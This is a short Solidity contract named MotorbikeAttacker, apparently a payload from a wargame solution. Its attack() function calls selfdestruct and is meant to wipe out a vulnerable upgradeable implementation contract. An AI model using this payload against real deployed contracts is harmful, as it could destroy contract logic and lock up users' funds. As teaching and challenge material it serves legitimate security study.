// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract MotorbikeAttacker {

    function attack() external {
        selfdestruct(payable(msg.sender));
    }
}
